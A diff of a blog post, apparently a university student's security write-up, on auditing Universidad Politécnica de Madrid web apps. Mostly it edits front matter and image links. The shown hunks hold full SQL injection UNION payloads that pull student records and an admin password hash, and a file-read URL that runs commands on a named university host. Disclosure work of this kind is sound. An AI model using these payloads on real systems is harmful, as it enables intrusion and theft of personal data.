@@ -1,15 +1,16 @@
 ---
 title: "A University Web Audit"
 keywords: "default creds, sqli, lfr, rce, xss, blind-xss, university, web security, account takeover"
-date: 2025-10-06
+date: 2025-10-06 12:00:00 +0200
 lastmod: 2025-10-06
 categories: [Security, Web-Security]
-tags: [default-creds, sqli, lfr, rce, xss, blind-xss, university, web-security, account-takeover]
+description: "Blind XSS, SQL injection, weak admin credentials and a local file read that ends in remote code execution: findings from auditing my university's web applications."
 toc: true
 math: false
 mermaid: true
 image:
-  path: /assets/img/upm-vulnerabilities/logo-2.png
+  path: /assets/img/upm-vulnerabilities/logo-2.jpg
+  alt: Seal of the Universidad Politécnica de Madrid
 ---
 
 
@@ -23,7 +24,7 @@ During my final degree project, I audited several web applications from my unive
 - **[Local File Read to RCE](#remote-code-execution-via-local-file-read)**: Chaining a file inclusion vulnerability to achieve remote code execution.
 
 
-> The complete write-up, along with much more context about the applications and vulnerabilities, can be read [here](https://oa.upm.es/90101/1/TFG_JORGE_CEREZO_DACOSTA.pdf){:target="_blank"} (although it is in Spanish).
+> The complete write-up, along with much more context about the applications and vulnerabilities, can be read in [my bachelor's thesis](https://oa.upm.es/90101/1/TFG_JORGE_CEREZO_DACOSTA.pdf){:target="_blank"} (although it is in Spanish).
 
 
 
@@ -133,11 +134,11 @@ For example, the following national ID and enrollment number values returned com
 ```mermaid
 %%{init: { "flowchart": { "wrappingWidth": 360 } }}%%
 flowchart TD
-    B["enrollment number</br></br>*'OR ''*"] --> D["length==6  ✅"]
-    C["National ID</br></br>*=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- -*"] --> E["quotes removed  ✅"]
+    B["enrollment number</br></br>'OR ''"] --> D["length==6  ✅"]
+    C["National ID</br></br>=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- -"] --> E["quotes removed  ✅"]
     D --> G["UNION SELECT from STUDENT executes"]
     E --> G["UNION SELECT from STUDENT executes"]
-    G --> H["**Group identifier lookup response:**</br></br>Student with National ID/Passport:</br>*=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- -* </br></br>and with enrollment number:</br>*'OR ''* </br></br>is assigned the group number:</br><mark>10425 José Luis 33333333 000009 Fuertes Castro admin\@fi.upm.es G-553T</mark>"]
+    G --> H["Group identifier lookup response:</br></br>Student with National ID/Passport:</br>=2 UNION SELECT CONCAT(STUDENTID, CHAR(32), STUDENTNAME, CHAR(32), nationalId, CHAR(32), ENROLLMENTNUMBER, CHAR(32), SURNAME, CHAR(32), EMAIL, CHAR(32), GROUP) FROM STUDENT WHERE STUDENTID = 10425-- - </br></br>and with enrollment number:</br>'OR '' </br></br>is assigned the group number:</br><mark>10425 José Luis 33333333 000009 Fuertes Castro admin@fi.upm.es G-553T</mark>"]
 ```
 
 
@@ -147,11 +148,11 @@ Similarly, administrator data could be extracted:
 ```mermaid
 %%{init: { "flowchart": { "wrappingWidth": 360 } }}%%
 flowchart TD
-    B["enrollment number</br></br>*'OR ''*"] --> D["length==6  ✅"]
-    C["National ID</br></br>*=2 UNION SELECT CONCAT(ADMINID, CHAR(32), ADMINNAME, CHAR(32), SURNAMEADM, CHAR(32), USER, CHAR(32), PASSWORD, CHAR(32), EMAIL, CHAR(32), ADMIN) FROM ADMINISTRATOR-- -*"] --> E["quotes removed  ✅"]
+    B["enrollment number</br></br>'OR ''"] --> D["length==6  ✅"]
+    C["National ID</br></br>=2 UNION SELECT CONCAT(ADMINID, CHAR(32), ADMINNAME, CHAR(32), SURNAMEADM, CHAR(32), USER, CHAR(32), PASSWORD, CHAR(32), EMAIL, CHAR(32), ADMIN) FROM ADMINISTRATOR-- -"] --> E["quotes removed  ✅"]
     D --> G["UNION SELECT from ADMINISTRATOR executes"]
     E --> G["UNION SELECT from ADMINISTRATOR executes"]
-    G --> H["**Group identifier lookup response:**</br></br>Student with National ID/Passport:</br>*=2 UNION SELECT CONCAT(ADMINID, CHAR(32), ADMINNAME, CHAR(32), SURNAMEADM, CHAR(32), USER, CHAR(32), PASSWORD, CHAR(32), EMAIL, CHAR(32), ADMIN) FROM ADMINISTRATOR-- -*</br></br>and with enrollment number:</br>*'OR ''*</br></br>is assigned the group number:</br><mark>10 admin admin admin $1$aE4.badsb78...5c1 admin\@fi.upm.es 1</mark>"]
+    G --> H["Group identifier lookup response:</br></br>Student with National ID/Passport:</br>=2 UNION SELECT CONCAT(ADMINID, CHAR(32), ADMINNAME, CHAR(32), SURNAMEADM, CHAR(32), USER, CHAR(32), PASSWORD, CHAR(32), EMAIL, CHAR(32), ADMIN) FROM ADMINISTRATOR-- -</br></br>and with enrollment number:</br>'OR ''</br></br>is assigned the group number:</br><mark>10 admin admin admin $1$aE4.badsb78...5c1 admin@fi.upm.es 1</mark>"]
 ```
 
 
@@ -214,7 +215,7 @@ sequenceDiagram
 **Sensitive files with PII of hundreds of students** were accessible, leaking names, national IDs, enrollment numbers, and more information dating back to 2016:
 
 
-![Leaked Students](../assets/img/upm-vulnerabilities/alumnos.png)
+![Spreadsheet of student records: file number, national ID, name, group and e-mail, with the personal data blurred](/assets/img/upm-vulnerabilities/alumnos.webp){: w="850" h="557" }
 
 
 > Later, it was discovered that those files were also being served publicly without any restrictions, so any user who knew or guessed their route could access them directly.
@@ -259,7 +260,7 @@ sequenceDiagram
 
 So the result after visiting `https://dlsiis.fi.upm.es/procesadores/layout.php?view=/var/www/html/draco/images/avatares/27104.jpg&cmd=whoami` would look like the following:
 
-![RCE](../assets/img/upm-vulnerabilities/rce.png)
+![University page header followed by the output of the injected command: www-data www-data](/assets/img/upm-vulnerabilities/rce.webp){: w="2007" h="387" }
 
 ## Conclusion
 
